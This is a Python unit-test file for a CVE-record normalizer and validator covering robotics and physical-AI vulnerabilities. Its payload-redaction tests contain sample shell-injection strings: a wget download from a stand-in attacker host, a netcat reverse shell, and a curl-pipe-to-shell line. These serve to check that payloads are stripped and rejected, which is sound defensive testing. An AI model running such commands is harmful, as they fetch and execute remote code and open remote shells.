import unittest

from faultline.normalize import normalize
from faultline.schema import validate
from faultline.taxonomy import canonical_domain, canonical_layer, canonical_vendor


def base_record(**over):
    rec = {
        "cve_id": "CVE-2024-0001",
        "title": "Test",
        "description": "desc",
        "source": {"nvd": "https://nvd.nist.gov/vuln/detail/CVE-2024-0001", "cve_org": "https://www.cve.org/CVERecord?id=CVE-2024-0001"},
        "published": "2024-01-02",
        "last_modified": "2024-01-03",
        "vuln_status": "Analyzed",
        "cwe": {"id": "CWE-20", "name": "Improper Input Validation"},
        "cvss": {"version": "3.1", "score": 7.5, "severity": "HIGH", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
        "taxonomy": {
            "physical_ai_domain": [{"domain": "Industrial Robot", "confidence": 0.9, "rationale": "r"}],
            "vendor": ["ABB"],
            "product": ["IRC5"],
            "technical_layer": [{"layer": "Hardware / Firmware", "technologies": ["x"]}],
            "attack_surface": ["network"],
            "vulnerability_class": ["RCE"],
        },
        "attack_chain": {"preconditions": [], "steps": ["1. a", "2. b"], "physical_consequence": "stop"},
        "impact": {"confidentiality": "HIGH"},
        "security_observations": {"root_cause": "x"},
        "cross_domain_tags": ["t"],
        "mitigation": {"patch_available": True, "fixed_version": None, "workaround": None, "fix_description": "upgrade"},
        "mapping_to_pavt": {"primary_domain": "Industrial Robot", "secondary_domains": []},
        "enrichment": {"method": "curated", "reviewed": True},
    }
    rec.update(over)
    return rec


class TaxonomyTests(unittest.TestCase):
    def test_aliases(self):
        self.assertEqual(canonical_layer("AI / ML Inference Engine"), "AI/ML Runtime / Inference")
        self.assertEqual(canonical_layer("Flight Controller / Firmware"), "Hardware / Firmware")
        self.assertEqual(canonical_layer("Hardware / Firmware"), "Hardware / Firmware")
        self.assertIsNone(canonical_layer("Quantum Layer"))
        self.assertEqual(canonical_domain("Cross-Domain Components"), "Cross-Domain Components")
        self.assertIsNone(canonical_domain("AI/ML Runtime / Inference"))
        self.assertEqual(canonical_vendor("ECOVACS ROBOTICS"), "ECOVACS")
        self.assertEqual(canonical_vendor("PX4 (Dronecode Foundation / Auterion)"), "PX4 Autopilot Project")
        self.assertEqual(canonical_vendor("Acme Robots"), "Acme Robots")


class NormalizeTests(unittest.TestCase):
    def test_valid_record_unchanged(self):
        rec, changes = normalize(base_record())
        self.assertEqual(changes, [])
        self.assertEqual(validate(rec), ([], []))

    def test_string_layers_and_domains(self):
        rec = base_record()
        rec["taxonomy"]["technical_layer"] = ["Hardware / Firmware", "Safety Systems", {"layer": "Hardware / Firmware", "technologies": ["fw"]}]
        rec["taxonomy"]["physical_ai_domain"] = ["Drone & Aerial Robotics"]
        out, changes = normalize(rec)
        self.assertEqual(out["taxonomy"]["technical_layer"], [{"layer": "Hardware / Firmware", "technologies": ["fw"]}])
        self.assertEqual(out["taxonomy"]["physical_ai_domain"][0]["domain"], "Drone & Aerial Robotics")
        self.assertEqual(out["taxonomy"]["physical_ai_domain"][0]["confidence"], 0.8)
        self.assertEqual(validate(out)[0], [])

    def test_layer_filed_as_domain_is_moved(self):
        rec = base_record()
        rec["taxonomy"]["physical_ai_domain"] = [
            {"domain": "Physical AI Infrastructure", "confidence": 0.9, "rationale": "r"},
            {"domain": "AI/ML Runtime / Inference", "confidence": 0.7, "rationale": "inference proxy"},
        ]
        rec["taxonomy"]["technical_layer"] = [{"layer": "Physical AI Infrastructure / MLOps", "technologies": []}]
        out, _ = normalize(rec)
        doms = [d["domain"] for d in out["taxonomy"]["physical_ai_domain"]]
        layers = [l["layer"] for l in out["taxonomy"]["technical_layer"]]
        self.assertEqual(doms, ["Physical AI Infrastructure"])
        self.assertIn("AI/ML Runtime / Inference", layers)
        self.assertEqual(validate(out)[0], [])

    def test_layer_as_domain_gets_fallback_domain(self):
        rec = base_record()
        rec["taxonomy"]["physical_ai_domain"] = [{"domain": "Mobile Companion App", "confidence": 0.9, "rationale": "app"}]
        out, _ = normalize(rec)
        self.assertEqual(out["taxonomy"]["physical_ai_domain"][0]["domain"], "Service & Companion Robot")
        self.assertIn("Mobile Companion App", [l["layer"] for l in out["taxonomy"]["technical_layer"]])

    def test_layer_as_domain_not_replaced_when_other_domains_exist(self):
        rec = base_record()
        rec["taxonomy"]["physical_ai_domain"] = [
            {"domain": "Humanoid & Legged Robot", "confidence": 0.9, "rationale": "r"},
            {"domain": "Mobile Companion App", "confidence": 0.8, "rationale": "app"},
        ]
        out, _ = normalize(rec)
        self.assertEqual([d["domain"] for d in out["taxonomy"]["physical_ai_domain"]], ["Humanoid & Legged Robot"])
        self.assertIn("Mobile Companion App", [l["layer"] for l in out["taxonomy"]["technical_layer"]])

    def test_vendor_objects_and_aliases(self):
        rec = base_record()
        rec["taxonomy"]["vendor"] = [{"name": "ECOVACS ROBOTICS", "confidence": 0.9}, "ECOVACS"]
        out, _ = normalize(rec)
        self.assertEqual(out["taxonomy"]["vendor"], ["ECOVACS"])

    def test_garbage_status_and_dates(self):
        rec = base_record(vuln_status="NVD data unavailable (HTTP 429 during fetch)", published="2024-01-02T10:00:00.000")
        out, _ = normalize(rec)
        self.assertIsNone(out["vuln_status"])
        self.assertEqual(out["published"], "2024-01-02")

    def test_idempotent(self):
        rec = base_record()
        rec["taxonomy"]["technical_layer"] = ["Connectivity / Wireless"]
        once, _ = normalize(rec)
        twice, changes = normalize(once)
        self.assertEqual(once, twice)
        self.assertEqual(changes, [])


class ValidateTests(unittest.TestCase):
    def test_rejects_unknown_vocab(self):
        rec = base_record()
        rec["taxonomy"]["technical_layer"] = [{"layer": "Quantum Layer", "technologies": []}]
        errors, _ = validate(rec)
        self.assertTrue(any("Quantum Layer" in e for e in errors))

    def test_rejects_bad_severity(self):
        rec = base_record()
        rec["cvss"]["severity"] = "Severe"
        errors, _ = validate(rec)
        self.assertTrue(any("severity" in e for e in errors))

    def test_missing_description_is_warning(self):
        rec = base_record()
        del rec["description"]
        errors, warnings = validate(rec)
        self.assertEqual(errors, [])
        self.assertTrue(warnings)


if __name__ == "__main__":
    unittest.main()


class CweSourceTests(unittest.TestCase):
    def test_cwe_list_forms(self):
        rec = base_record(cwe=[{"id": "CWE-74", "name": "A"}, {"id": "CWE-94", "name": "B"}])
        out, _ = normalize(rec)
        self.assertEqual(out["cwe"]["id"], "CWE-74")
        self.assertEqual(out["cwe"]["additional"], [{"id": "CWE-94", "name": "B"}])
        rec = base_record(cwe={"id": ["CWE-122", "CWE-787"], "name": ["x", "y"]})
        out, _ = normalize(rec)
        self.assertEqual(out["cwe"], {"id": "CWE-122", "name": "x", "additional": [{"id": "CWE-787", "name": "y"}]})
        self.assertEqual(validate(out)[0], [])

    def test_source_shapes(self):
        rec = base_record(source={"nvd": None, "advisory": "https://x"})
        out, _ = normalize(rec)
        self.assertEqual(out["source"]["nvd"], "https://nvd.nist.gov/vuln/detail/CVE-2024-0001")
        self.assertEqual(out["source"]["cve_org"], "https://www.cve.org/CVERecord?id=CVE-2024-0001")
        rec = base_record(source={"nvd": {"url": "https://nvd.nist.gov/vuln/detail/CVE-2024-0001"}})
        out, _ = normalize(rec)
        self.assertIsInstance(out["source"]["nvd"], str)


class PlaceholderAffectedTests(unittest.TestCase):
    def test_na_rows_dropped(self):
        from faultline.normalize import normalize
        rec = {
            "cve_id": "CVE-2023-50121",
            "affected_configurations": [
                {"vendor": "autelrobotics", "product": "evo_nano_drone_firmware", "versions": ["1.6.5"]},
                {"vendor": "n/a", "product": "n/a", "versions": ["n/a"]},
            ],
        }
        out, changes = normalize(rec)
        self.assertEqual(len(out["affected_configurations"]), 1)
        self.assertTrue(any("placeholder" in c for c in changes))


class LegacyShapeTests(unittest.TestCase):
    def test_paths_attack_chain_canonicalized(self):
        from faultline.normalize import canonical_attack_chain
        ac = {"paths": [
            {"path_id": "A", "name": "Main", "attack_vector": "adjacent Wi-Fi",
             "steps": [{"step": 1, "description": "join network"}, {"step": 2, "description": "send packet"}],
             "physical_consequence": "robot stops"},
            {"id": "B", "label": "Alt", "steps": ["1. other", "2. thing"]},
        ]}
        out, changed = canonical_attack_chain(ac)
        self.assertTrue(changed)
        self.assertEqual(out["steps"], ["1. join network", "2. send packet"])
        self.assertEqual(out["preconditions"], ["adjacent Wi-Fi"])
        self.assertEqual(out["physical_consequence"], "robot stops")
        self.assertEqual(out["name"], "Main")
        self.assertEqual(out["alternate_paths"][0]["name"], "Alt")
        self.assertEqual(out["alternate_paths"][0]["steps"], ["1. other", "2. thing"])
        # idempotent
        again, changed2 = canonical_attack_chain(dict(out))
        self.assertFalse(changed2)

    def test_mitigation_variants(self):
        from faultline.normalize import canonical_mitigation
        m, _ = canonical_mitigation({"description": "Upgrade.", "patch": {"available": True, "url": "https://x/commit/1", "description": "Fix adds check."}})
        self.assertEqual(m["patch_available"], True)
        self.assertEqual(m["fix_description"], "Upgrade.")
        self.assertEqual(m["references"], ["https://x/commit/1"])
        m, _ = canonical_mitigation({"short_term": "Upgrade to 2.3.0.", "long_term": "Allowlist types."})
        self.assertEqual(m["fix_description"], "Upgrade to 2.3.0.")
        self.assertIn("Long term: Allowlist types.", m["notes"])
        m, _ = canonical_mitigation({"patch_available": True, "workaround": "w", "fix_versions": ["7.5.0", "7.3.0.7"]})
        self.assertEqual(m["fixed_version"], "7.5.0, 7.3.0.7")
        m, _ = canonical_mitigation({"official_fix": None, "workaround": "isolate", "detection": "watch ports"})
        self.assertIsNone(m["patch_available"]); self.assertEqual(m["detection"], "watch ports")
        m, changed = canonical_mitigation(None)
        self.assertTrue(changed); self.assertEqual(set(m), {"patch_available", "fixed_version", "workaround", "fix_description"})
        canon = {"patch_available": False, "fixed_version": None, "workaround": None, "fix_description": "x"}
        self.assertEqual(canonical_mitigation(dict(canon)), (canon, False))

    def test_primary_domain_follows_confidence(self):
        from faultline.normalize import normalize
        rec = {"cve_id": "CVE-2024-0001", "taxonomy": {"physical_ai_domain": [
                   {"domain": "Industrial Robot", "confidence": 0.4, "rationale": "r"},
                   {"domain": "Cross-Domain Components", "confidence": 0.9, "rationale": "r"}]},
               "mapping_to_pavt": {"primary_domain": "Industrial Robot", "secondary_domains": ["Cross-Domain Components"]}}
        out, changes = normalize(rec)
        self.assertEqual(out["mapping_to_pavt"]["primary_domain"], "Cross-Domain Components")
        self.assertEqual(out["mapping_to_pavt"]["secondary_domains"], ["Industrial Robot"])
        self.assertEqual(out["enrichment"], {"method": "curated", "reviewed": True})


class PayloadRedactionTests(unittest.TestCase):
    def test_payload_removed_concept_kept(self):
        from faultline.normalize import _redact_payload, contains_payload
        s = 'Attacker sets ssid to a shell injection payload, e.g.: ";$(wget http://attacker.host/b.sh -O /tmp/b.sh);#" then connects'
        out = _redact_payload(s)
        self.assertFalse(contains_payload(out))
        self.assertIn("shell injection", out)

    def test_benign_text_unchanged(self):
        from faultline.normalize import _redact_payload
        s = "Attacker publishes a crafted geometry_msgs/PoseWithCovarianceStamped message to /initialpose"
        self.assertEqual(_redact_payload(s), s)

    def test_stubborn_step_fully_redacted(self):
        from faultline.normalize import _redact_payload, contains_payload
        out = _redact_payload("3. run nc -e /bin/sh 10.0.0.1 4444 ;# 0xdeadbeef")
        self.assertFalse(contains_payload(out))
        self.assertTrue(out.startswith("3."))

    def test_schema_rejects_payload(self):
        import json, pathlib
        from faultline.schema import validate
        rec = json.loads(pathlib.Path("CVE-json").glob("*.pavd.json").__next__().read_text())
        rec["attack_chain"]["steps"] = ["1. do a thing", "2. run $(curl http://evil/x|sh)"]
        errors, _ = validate(rec)
        self.assertTrue(any("payload" in e for e in errors))
